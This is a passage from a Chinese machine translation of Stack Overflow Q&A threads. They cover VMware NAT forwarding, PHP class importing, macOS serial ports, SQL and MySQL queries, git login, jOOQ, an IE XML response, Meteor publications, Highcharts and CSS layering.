    C:\Users\Application Data\VMware\vmnetnat.conf 
    ```

2.  编辑，在部分`vmnetnat`添加类似的行`[incomingtcp]`

    ```
    8200=192.168.198.184:3000 
    ```

3.  重启`VMware NAT Service`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-04-23T09:11:08.443

尝试在 vmware player 中使用桥接网络选项而不是 NAT。它复制您的物理网络。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-05-03T18:17:18.013

您可以使用 http 代理来执行此操作，这样做您不需要公开整个私有网络，请查看此博客文章以获取有关[如何从外部设备访问 docker 容器的更多信息](http://blog.nunes.io/2015/05/02/how-to-access-docker-containers-from-external-devices.html)

# php - 如何在php中使用分配给另一个类中另一个类的属性的类的实例

> ID：14074412
> 
> 赞同：3
> 
> 时间：2012-12-28T19:03:31.247
> 
> 标签：php

我正在用 PHP 制作一个框架。我在 library/core.php 中有一个导入函数。

我可以使用这样的功能：

```
$core->import("someclass"); 
```

这是功能：

```
public function import()
    {
        $import_resources = func_get_args();

        $check_directories = array("library", "template", "view", "action", "errors");

        $instances = array();

        foreach($import_resources as $resource)
        {
            for($i = 0; $i <= count($check_directories) - 1; $i++)
            {
                if(file_exists($this->appRoot() . $check_directories[$i] . "/" . $resource . ".php"))
                {

                    $classes = get_declared_classes();
                    include ($check_directories[$i] . "/" . $resource . ".php");
                    $included_classes = array_diff(get_declared_classes(), $classes);
                    $last_class = end($included_classes);

                    $last_class_lowercase = strtolower($last_class);

                    $this->$last_class_lowercase = new $last_class(); 
                    // create an instance of the included class and attach it to the Core Class

                }

                else
                {

                }   
            }
        }

    } 
```

所以在另一个类中，我可以这样使用它：

```
$core->import("view");
$core->view->get(); 
```

这样做的重点是使包含的类在扩展时在另一个类中可用。

```
class Someclass extends Core
{
    public function somefunc()
    {
        $this->view->get(); // This does not work. 
    }
} 
```

我怎么能让它像这样工作？这是框架中非常重要的部分，因为它是这样工作的。我认为它在 CodeIgniter 等流行框架中的工作方式也类似。

我试图使用`parent::view->get()`，但我想我并不完全理解它。

我希望我能解决这个问题，因为它阻碍了我的工作。先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:34:14.490

您想要做的是使用“魔术方法”，这个特定的方法（__get() 获取无法从外部访问的属性）。您将希望像这样使用它：

```
<?php
// --- Begin Importer.php --------------------
class Importer{
    protected $classes = array();

    public function __get($method_name){
        if(array_key_exists($method_name, $this->classes)){
            return $this->classes[$method_name];
        }
    }

    public function import($class_name){
        // Do this or use an auto loader
        require_once __DIR__ . "/../classes/$class_name";
        $this->classes[$class_name] = new $class_name();
    }
}
// --- End Importer.php ---------------------

// --- Begin MyClass.php --------------------
class MyClass{
    public function get(){
        return "hello";
    }
}
// --- End MyClass.php ----------------------

// --- Where ever you call Importer ---------
$importer = new Importer();
$importer->import("MyClass");

echo $importer->MyClass->get(); 
```

# macos - Mac OS X 上的串行端口名称

> ID：14074413
> 
> 赞同：1
> 
> 时间：2012-12-28T19:03:35.573
> 
> 标签：macos, serial-port

我正在用 Qt 开发一个跨平台的用户界面，我需要通过串口进行通信。通过使用以下端口名称，我可以在 Windows 和 Linux 上使用串行端口：

*   Windows 上的 COM1、COM2 等；

*   Linux 上的 ttyACM0、ttyS0、ttyS1 等。

现在我想在 Mac OS X 上做同样的事情。你知道 Mac OS X 上可能的端口名称是什么吗？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:06:46.057

它们几乎可以是任何东西。他们*可能*会`/dev/tty.SOMETHING`，但不能保证。例如，我的 USB->serial dongle 是：`/dev/tty.usbserial-FTG6RCEJ`. 我认为最后一点乱码是序列号或其他东西。

无论如何，您不应该询问用户使用哪个端口吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-07-14T17:48:46.920

要在 Mac OS X 中使用编程器，您需要确定已为其串行端口分配了哪些名称。

为此，请打开终端窗口，键入`ls /dev/tty.usb*`，然后按 Enter。您应该看到表单的两个条目`tty.usbmodem<number>`（例如`/dev/tty.usbmodem00022331`）。这些条目代表程序员创建的虚拟串行端口。

编号较小的条目是您的程序员的编程端口，稍后您需要将其名称作为参数传递给 AVRDUDE。编号较大的条目（应为 2 加上较小的编号）是 TTL 串行端口，您可以使用终端程序`screen`从它发送和接收字节。

如果您插入了其他 USB 设备，您可能会看到这些设备的其他串行端口。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:06:28.567

使用 Arduino，我的一个是：

/dev/tty.usbmodemfa131

每个端口的最后 5 个字符都不同。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-28T19:10:21.527

OS X 中串行端口的名称取决于驱动程序。可能是这样的`/dev/tty.USBSERIAL/`，也可能是`/dev/tty.PL2303-xxx`

您可能希望让用户创建一个符号链接，例如`/dev/tty.MY_APP_USB`指向其特定串行端口的符号链接。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2017-07-19T12:59:45.213

许多 USB->miniUSB 电缆没有插入所有引脚，只有 Vcc 和 GND。他们，电缆可能是问题所在

# regex - 用于自定义字符串验证的正则表达式

> ID：14074420
> 
> 赞同：3
> 
> 时间：2012-12-28T19:04:16.183
> 
> 标签：regex

我需要制作一个正则表达式模式来检查整个输入字符串是否由字符 az、AZ、0-9 组成，中间没有空格。我尝试使用`^[ ]*[a-zA-Z0-9][ ]*$`查找，但由于某种原因它不起作用。

例如，`" dnsjkfs32NJ"` 是一个有效的字符串，但`"fds fsdfs"`不是。

谢谢。:)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T19:09:41.137

这可能对你有用

```
^\s*[a-zA-Z0-9]+\s*$ 
```

你`+`在你的角色课之后错过了一个；没有它，它只匹配一个字符。

# sql - 插入一些带有常量的变量列

> ID：14074421
> 
> 赞同：0
> 
> 时间：2012-12-28T19:04:22.850
> 
> 标签：sql, variables, insert, constants

我希望对我的代码执行的操作是将一些可变数量的行插入到 test_table 中，其中 source_table 中的“policy”与 policy_custsgt 中的“bond_ser”匹配，而 source_table 中的“SNL_ID”与 raw_table 中的“inst_key”匹配。

我希望它插入 serial_number 和 ID 以及其他一些常量。我可以让它插入 serial_number 和 ID 就好了，但是每次它从其他表中插入变量时，如何让它在表的其他字段中添加一些常量？

这是我目前拥有的代码，如果我从第一行中删除“'122812'、'999999'、'myname'”，它可以正常工作，但只会在每次插入时填充我的表的序列号和 ID 列。

```
INSERT INTO test_table(serial_number, ID, '122812', '999999', 'myname')
SELECT policy, SNL_ID
FROM source_table
WHERE (policy IN (SELECT bond_ser from policy_custsgt)) AND 
(SNL_ID in (select inst_key from raw_table)) 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:10:21.427

当然，我看过简单的解决方案。我需要做的就是将我想要的那些常量从 INSERT 语句中移到 SELECT 语句中，然后在 INSERT 中添加列名，这样：

```
INSERT INTO test_table(serial_number, ID, starting_date, ending_date, user_id)
SELECT policy, SNL_ID, '122812', '999999', 'myname'
FROM source_table
WHERE (policy IN (SELECT bond_ser from policy_custsgt)) AND 
(SNL_ID in (select inst_key from raw_table)) 
```

# mysql - 排序后选择一条记录

> ID：14074423
> 
> 赞同：0
> 
> 时间：2012-12-28T19:04:28.180
> 
> 标签：mysql, sql-order-by

我有一堆包含一堆艺术品的 CD。我想在网页上显示每张 CD 的缩略图图像，为此我需要从该 CD 存在的许多艺术品中只选择一个图像...

该查询选择所有艺术品，我按位置分组并希望选择第一个。在我订购它们之后，我不知道如何为每条记录挑选第一张图片......

查询如下：

```
SELECT release_artwork.release_id, release_artwork.position, artwork.small_filename, artwork.small_width, artwork.small_height
FROM release_artwork
JOIN artwork ON artwork.artwork_id = release_artwork.artwork_id
ORDER BY release_artwork.position 
```

![在此处输入图像描述](../Images/d6aed613637ae845a5ac639d4b7a7904.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T19:17:46.147

我没有方便的 MySQL 实例，但这应该可以 - 只需定义一个内联表来保存最小值，然后加入它。

```
SELECT release_artwork.release_id, release_artwork.position, artwork.small_filename, artwork.small_width, artwork.small_height
FROM
  release_artwork
  inner JOIN artwork ON artwork.artwork_id = release_artwork.artwork_id
  inner join
  (
  SELECT
    ra.release_id as release_id
   ,min(ra.position) as rap
  FROM
    release_artwork ra
  group by
    ra.release_id
  ) mins
  on mins.release_id = release_artwork.release_id
    and mins.rap = release_artwork.position
ORDER BY
  release_artwork.release_id 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:06:30.763

在这种情况下，您可以使用`LIMIT 1`, 将检索到的结果限制为第一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:08:12.433

```
SELECT release_artwork.release_id, release_artwork.position, artwork.small_filename, artwork.small_width, artwork.small_height
FROM release_artwork
JOIN artwork ON artwork.artwork_id = release_artwork.artwork_id
ORDER BY release_artwork.position LIMIT 1 
```

在末尾添加`LIMIT 1`会将其限制为单个结果。

# git - 无法使用 powershell 登录 git

> ID：14074428
> 
> 赞同：0
> 
> 时间：2012-12-28T19:04:58.313
> 
> 标签：git, powershell, github

我正在尝试将项目推送到 git repo 但无法登录。我正在使用我的 git 帐户用户名/密码（100% 确定，至少检查了 10 次）但每次登录都失败。这是我尝试 git push 时得到的：

1.  'http://www.github.com' 的用户名：~MyUsername~
2.  'http://~MyUsername~@www.github.com' 的密码：~MyPassword~
3.  致命：认证失败

我可以毫无问题地与他们一起登录 github.com。感谢您提前提供任何帮助！

编辑：与 Git Bash 完全相同

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:10:58.013

您不能通过 HTTP 协议推送。您需要使用 HTTPS。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:14:35.317

解决了，我将地址从[http://www.github.com](http://www.github.com)更改为[http://github.com](http://github.com) Dunnow，如果这是干净的方法，但它有效。

# java - 如何使用带有连接的查询从 jOOQ 中的一个表中进行选择？

> ID：14074429
> 
> 赞同：13
> 
> 时间：2012-12-28T19:05:15.233
> 
> 标签：java, mysql, jooq

我在 jOOQ 中有以下查询：

```
factory()
.select()
.from(PERSON)
.join(ENDUSER).on(ENDUSER.PERSON_FK.equal(PERSON.ID))
.where(ENDUSER.ID.equal(userId))
.fetchOne(); 
```

此查询返回给我一个记录，其中包含来自 PERSON 和 ENDUSER 的所有列，但我只想要来自 PERSON 的列（这就是我放置`.from(PERSON)`而不是放置的原因`.from(PERSON, ENDUSER)`）。我知道这无关紧要，但我不希望返回不必要的字段。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-28T19:13:55.587

`PERSON`您可以通过以下方法访问字段`Table.fields()`：

```
factory()
.select(PERSON.fields()) // Or getFields() in jOOQ 2.x
.from(PERSON)
.join(ENDUSER)... 
```

这和写的差不多

```
SELECT PERSON.*
FROM PERSON
JOIN ENDUSER ... 
```

另一种选择是实际逐个列出人员的所有字段

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-12-17T00:53:21.837

Lukas 的回答正是我想要的。您还可以使用该`into()`方法仅针对您关心的表（而不是泛型`Record`类型）获取强类型响应对象：

```
PersonRecord record = factory()
  .select()
  .from(PERSON)
  .join(ENDUSER).on(ENDUSER.PERSON_FK.equal(PERSON.ID))
  .where(ENDUSER.ID.equal(userId))
  .fetchOne()
  .into(PERSON); 
```

# c# - XML 未在 IE 中通过响应对象正确发送到客户端

> ID：14074431
> 
> 赞同：6
> 
> 时间：2012-12-28T19:05:22.193
> 
> 标签：c#, jquery, asp.net, xml

我有一个上传控件，它从客户端调用处理程序，并将一串 xml 发送回客户端。下面的代码在 chrome 中运行良好，但在 IE 中将奇怪的 xml 发送回客户端。

处理程序代码：

```
public void ProcessRequest(HttpContext context)
{
    if (context.Request.Files.Count > 0)
    {
        var uploadInfo = context.Request.Files[0];
        var uploadStream = uploadInfo.InputStream;
        var upload = new byte[uploadInfo.ContentLength];
        uploadStream.Read(upload, 0, uploadInfo.ContentLength);
        var payload = System.Text.Encoding.UTF8.GetString(upload);

        XmlDocument doc = new XmlDocument();
        doc.LoadXml(payload);
        context.Response.ContentType = "application/xml";
        context.Response.Write(doc.OuterXml);

        //context.Response.Write(payload);
    }        
} 
```

在发送到客户端之前从处理程序调试的 XML 字符串（看起来正确）

```
<?xml version="1.0"?>  
 <ApplicationData>
 <DataElement name="Comments" type="String"></DataElement> 
 <DataElement name="ModAuthor" type="String"></DataElement>  
 <DataElement name="CreateDate" type="Datetime"></DataElement>    
 <DataElement name="Author" type="String"></DataElement>   
 <DataElement name="StatusDate" type="Datetime"></DataElement>  
 <DataElement name="StatusDisp" type="String"></DataElement>   
 <DataElement name="Status" type="Number"></DataElement>   
 <DataElement name="Approved" type="Number"></DataElement> 
 <DataElement name="Submitted" type="Number"></DataElement>  
 <DataElement name="LogNumber" type="Number"></DataElement>  
 </ApplicationData> 
```

那么被发回的 XML 字符串是：

```
<DIV class=e><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;?</SPAN><SPAN class=pi>xml version="1.0" </SPAN><SPAN class=m>?&gt;</SPAN> </DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em" class=c><A class=b onfocus=h() onclick="return false" href="#">-</A> <SPAN class=m>&lt;</SPAN><SPAN class=t>ApplicationData</SPAN><SPAN class=m>&gt;</SPAN></DIV>
<DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>Comments</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>String</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>ModAuthor</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>String</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>CreateDate</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>Datetime</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>Author</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>String</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>StatusDate</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>Datetime</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>StatusDisp</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>String</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>Status</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>Number</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>Approved</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>Number</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV class=e>
<DIV style="TEXT-INDENT: -2em; MARGIN-LEFT: 1em"><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;</SPAN><SPAN class=t>DataElement</SPAN> <SPAN class=t>name</SPAN><SPAN class=m>="</SPAN><B>Submitted</B><SPAN class=m>"</SPAN><SPAN class=t> type</SPAN><SPAN class=m>="</SPAN><B>Number</B><SPAN class=m>"</SPAN><SPAN class=m> /&gt;</SPAN> </DIV></DIV>
<DIV><SPAN class=b>&nbsp;</SPAN> <SPAN class=m>&lt;/</SPAN><SPAN class=t>ApplicationData</SPAN><SPAN class=m>&gt;</SPAN></DIV></DIV></DIV> 
```

由于某种原因，XML 正在以完全不同的格式翻译给客户端。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-11T09:21:15.523

我有一种奇怪的感觉，这与编码有关，我曾经在 IE 上遇到过类似的问题。

我在您的代码中看到您使用 UTF-8 编码来获取 xml 作为字符串。尝试添加以下标题：

```
<?xml version="1.0" encoding="UTF-8"?> 
```

到您的 XML 文件。我知道如果你把它排除在外，它会被自动检测到，但试着这样做，并尝试用 Notepad++ 之类的东西打开你的文件并保存为 UTF-8 编码。此外，如果文件是实际生成的，请检查代码并尝试强制使用 UTF-8 编码。

以我对 Web 应用程序的经验来看，IE 出错的地方（最多）是有一些与 Chrome、Firefox、Opera、Safari 等不同的默认值。如果你没有明确输入这些值，浏览器会设置这是默认值，但如果您在代码中输入它们，您将强制执行某种行为。这对于 Chrome、Mozilla 等不是必需的，但会“修复”IE 的解释。

上述默认值之一是编码 [http://social.technet.microsoft.com/Forums/en-US/winserverGP/thread/2f5cdeff-3723-43bf-a880-d4a41222e24d/](http://social.technet.microsoft.com/Forums/en-US/winserverGP/thread/2f5cdeff-3723-43bf-a880-d4a41222e24d/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T11:52:35.697

“翻译”的 XML 看起来像 IE 在您直接加载没有 XSL 样式表的 XML 文件时生成的格式化 XML 视图。我猜您的上传控件的目标是 hidden `iframe`，并使用 DOM 加载响应。

根据您对 XML 所做的操作，您可能能够避免强制它以纯文本格式下载：

```
context.Response.ContentType = "text/plain";
context.Response.AppendHeader("X-Content-Type-Options", "nosniff"); 
```

您需要添加`X-Content-Type-Options: nosniff`标头以[防止 IE8 尝试猜测内容类型](http://blogs.msdn.com/b/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T16:31:22.560

更改以下行

```
context.Response.ContentType = "application/xml"; 
```

和

```
context.Response.ContentType = "text/xml"; 
```

# javascript - 在 Meteor 中如何有条件地向客户端发送数据？

> ID：14074434
> 
> 赞同：7
> 
> 时间：2012-12-28T19:05:26.553
> 
> 标签：javascript, meteor

我试图弄清楚如何有条件地将数据发送到[流星](http://meteor.com)中的客户端。我有两种用户类型，根据用户类型，他们在客户端上的界面（因此他们需要的数据不同）。

假设用户的类型为`counselor`or `student`。每个用户文档都有类似的东西`role: 'counselor'`or `role: 'student'`。

学生有学生的具体信息，例如`sessionsRemaining`和`counselor`，辅导员有`pricePerSession`等信息。

我如何确保`Meteor.user()`在客户端有我需要的信息，而没有额外的信息？如果我以学生身份登录，`Meteor.user()`则应包括`sessionsRemaining`and `counselor`，但如果我以辅导员身份登录，则不包括。我想我可能正在搜索的是流星术语的有条件的出版物和订阅。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-28T19:56:10.163

使用*fields*选项仅从 Mongo 查询中返回您想要的字段。

```
Meteor.publish("extraUserData", function () {
  var user = Meteor.users.findOne(this.userId);
  var fields;

  if (user && user.role === 'counselor')
    fields = {pricePerSession: 1};
  else if (user && user.role === 'student')
    fields = {counselor: 1, sessionsRemaining: 1};

  // even though we want one object, use `find` to return a *cursor*
  return Meteor.users.find({_id: this.userId}, {fields: fields});
}); 
```

然后在客户端上调用

```
Meteor.subscribe('extraUserData'); 
```

订阅可以在 Meteor 中重叠。因此，这种方法的巧妙之处在于，向客户端发送额外字段的发布功能与 Meteor 发送基本字段（如用户的电子邮件地址和个人资料）的幕后发布功能一起工作。在客户端，`Meteor.users`集合中的文档将是两组字段的并集。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T19:50:26.927

默认情况下，Meteor 用户仅发布其基本信息，因此您必须使用 Meteor.publish 手动将这些字段添加到客户端。值得庆幸的是，[发布的 Meteor 文档](http://docs.meteor.com/#meteor_publish)有一个示例向您展示如何执行此操作：

```
// server: publish the rooms collection, minus secret info.
Meteor.publish("rooms", function () {
  return Rooms.find({}, {fields: {secretInfo: 0}});
});

// ... and publish secret info for rooms where the logged-in user
// is an admin. If the client subscribes to both streams, the records
// are merged together into the same documents in the Rooms collection.
Meteor.publish("adminSecretInfo", function () {
  return Rooms.find({admin: this.userId}, {fields: {secretInfo: 1}});
}); 
```

基本上，您希望发布一个通道，该通道在满足条件时向客户端返回某些信息，而在不满足条件时返回其他信息。然后您在客户端订阅该频道。

在您的情况下，您可能希望在服务器中使用以下内容：

```
Meteor.publish("studentInfo", function() {
  var user = Meteor.users.findOne(this.userId);

  if (user && user.type === "student")
    return Users.find({_id: this.userId}, {fields: {sessionsRemaining: 1, counselor: 1}});
  else if (user && user.type === "counselor")
    return Users.find({_id: this.userId}, {fields: {pricePerSession: 1}});
}); 
```

然后在客户端订阅：

```
Meteor.subscribe("studentInfo"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T20:19:50.060

因为 Meteor.users 是一个与任何其他 Meteor 集合一样的集合，所以您实际上可以像任何其他 Meteor 集合一样细化它的公开内容：

```
Meteor.publish("users", function () {
    //this.userId is available to reference the logged in user 
    //inside publish functions
    var _role = Meteor.users.findOne({_id: this.userId}).role;
    switch(_role) {
        case "counselor":
            return Meteor.users.find({}, {fields: { sessionRemaining: 0, counselor: 0 }});
        default: //student
            return Meteor.users.find({}, {fields: { counselorSpecific: 0 }});
    }
}); 
```

然后，在您的客户端中：

```
Meteor.subscribe("users"); 
```

因此，`Meteor.user()`将根据登录用户的角色自动截断。

这是一个完整的解决方案：

```
if (Meteor.isServer) {
    Meteor.publish("users", function () {
        //this.userId is available to reference the logged in user 
        //inside publish functions
        var _role = Meteor.users.findOne({ _id: this.userId }).role;
        console.log("userid: " + this.userId);
        console.log("getting role: " + _role);
        switch (_role) {
            case "counselor":
                return Meteor.users.find({}, { fields: { sessionRemaining: 0, counselor: 0 } });
            default: //student
                return Meteor.users.find({}, { fields: { counselorSpecific: 0 } });
        }
    });

    Accounts.onCreateUser(function (options, user) {
        //assign the base role
        user.role = 'counselor' //change to 'student' for student data

        //student specific
        user.sessionRemaining = 100;
        user.counselor = 'Sam Brown';

        //counselor specific
        user.counselorSpecific = { studentsServed: 100 };

        return user;
    });
}

if (Meteor.isClient) {
    Meteor.subscribe("users");

    Template.userDetails.userDump = function () {
        if (Meteor.user()) {
            var _val = "USER ROLE IS " + Meteor.user().role + " | counselorSpecific: " + JSON.stringify(Meteor.user().counselorSpecific) + " | sessionRemaining: " + Meteor.user().sessionRemaining + " | counselor: " + Meteor.user().counselor;
            return _val;
        } else {
            return "NOT LOGGED IN";
        }
    };
} 
```

和 HTML：

```
<body>
    <div style="padding:10px;">
        {{loginButtons}}
    </div>

    {{> home}}
</body>

<template name="home">
    <h1>User Details</h1>
    {{> userDetails}}
</template>

<template name="userDetails">
   DUMP:
   {{userDump}}
</template> 
```

# javascript - highcharts 使用 addSeries 动态添加系列

> ID：14074435
> 
> 赞同：1
> 
> 时间：2012-12-28T19:05:39.143
> 
> 标签：javascript, dynamic, highcharts

我正在创建一个动态创建的图表，如果没有一个系列，它将添加一个系列，如果有一个则添加一个点。我收到一个未捕获的类型错误：无法调用未定义的方法“addSeries”。我环顾四周，找不到为什么它说该方法未定义。

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
<script type="text/javascript" src="highcharts.js"></script>
$(document).ready(function () {

    var chart1 = new Highcharts.Chart({
        chart: {
            renderTo: 'container',
            type: 'column',
            events: {
                load: requestData
            }
        },
        title: {
            text: 'Survey Chart'

        },
        xAxis: {
            categories: [],
            title: {
                text: 'Question Number'
            }

        },
        yAxis: {
            title: {
                text: 'Total Answered'
            }
        },
        legend: {
            layout: 'vertical',
            align: 'left',
            verticalAlign: 'top',
            x: 100,
            y: 70,
            floating: true
        },
        series: []
    }); 
```

使用文档准备功能占用整个脚本，我具有以下功能

```
 function requestData() {
    ajaxCall(chartCreate, createSeries, "services/Survey.svc/DoWork", "{}");
    chart1.redraw();
};

function chartCreate(point) {
    var temp;
    temp = $.parseJSON(point.d);
    $.each(temp, function (key, p) {
        var seriesObj;
        seriesObj = seriesExists(p.mcAnswer);
        if (seriesObj.status == false) {
            chart1.addSeries({name: '' + p.mcAnswer + '', data: [] });
            chart1.series[seriesObj.count].addPoint(p.total, false);
        } else {
            chart1.series[seriesObj.count].addPoint(p.total, false);
        }
    });
};

//loops through all the series to see if the series exists.
//if true returns index and true if not just returns false
function seriesExists(name) {
    var ct = 0;
    //var len = chart1.series.length;
    var len = 0;
    if (len > 0) {
        $.each(chart1.series, function (count, curSeries) {
            if (curSeries.name == name) {
                return { 'count': count, 'status': true };
            }
            ct = count;
        });
    }
    return { 'count': ct, 'status': false };
};    function createSeries() {
    alert("error");
};

//$.ajaxCall({successFun: function, errorFun: function, source: "", data: {}});
function ajaxCall(myFunSuccess, myFunError, url, data) {
    //chart1 = chartTemp;
    $.ajax({
        type: "POST",
        async: false,
        url: url,
        data: data,
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        success: myFunSuccess,
        error: myFunError
    });
    //return chart1;
}; 
```

我可以很好地使用 ajax 函数调用，这是当我到达我遇到问题的 chartCreate 时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:19:00.913

`chart1`问题是您在获取图表参考之前尝试添加系列。这就是为什么`chart1`没有`addSeries`方法。

[你可以在这里](http://jsfiddle.net/fNcYM/)看到这个问题。

`chart1`要修复它，您可以在 call 之前手动设置图表参考`requestData`。
像下面这样。

```
load: function() {
    chart1 = this; // `this` is the reference to the chart
    requestData();
} 
```

# css - 将背景图像提升到内容之上

> ID：14074443
> 
> 赞同：5
> 
> 时间：2012-12-28T19:06:23.120
> 
> 标签：css

好的，所以我想要发生的是我设置为背景图像以显示在页面上所有其他元素的顶部 - 设置在右侧，一半在内容块上，一半在侧面.. . 目前我的结构是：

```
 <div id="SideImage">
    <div id="Contain">
    <div id="Dash"></div>
    <div id="content">
    <h1>Heading 1</h1>
    <p>Content</p>
    </div>
    <div id="Footer">
    <p>Footer Content</p>
    </div>
    </div>
    </div> 
```

CSS 如下所示，当我使用 FireBug 时 z-index 不起作用，如果我从包含 css 中删除背景颜色，我可以看到完整的图像，但我希望 SideImage 覆盖包含背景、短划线背景和页脚。我能想到的唯一另一件事是在 SideImage Div 上方设置一个 Div，其背景颜色仅为特定宽度，并从 Contain Div 中删除背景颜色。有任何想法吗？

```
#Contain {
background-color: #FFFFFF;
margin: 0 auto;
position: relative;
text-align: left;
width: 850px;
z-index: 1;}

#Dash {
background-image: url("/23456jjsg886635kksjp/EQI/EQIImages/dash.png");
float: none !important;
height: 10px;
position: absolute;
top: 169px;
width: 850px;
z-index: 2;}

#content {
border-left: 2px solid #C5DFF3;
border-right: 2px solid #C5DFF3;
float: left;
position: relative;
width: 846px;
z-index: 3;}
#Footer {
background-color: #C5DFF3;
clear: both;
height: 60px;
padding-top: 5px;
position: relative;
width: 850px;
z-index: 4;}

#SideImage {
background-image: url("/23456jjsg886635kksjp/EQI/EQIImages/SideImage.png");
background-position: 85% top;
background-repeat: repeat-y;
position: relative;
z-index: 5;} 
```

[上面代码的JSFiddle](http://jsfiddle.net/uXgX6/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-07T19:42:07.850

好的，这就是我最终在页面上找到 HTML 的地方。

```
<div id="Contain">
  <div id="SideImage" class="ir">&nbsp;</div>
</div> 
```

对于我结束的CSS

```
#SideImage {
  background: url("/myLink/SideImage.png") repeat-y scroll 0 0 transparent;
  height: 100%;
  left: 748px;
  position: absolute;
  top: 0;
  width: 100%;
  z-index: 30;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:28:29.573

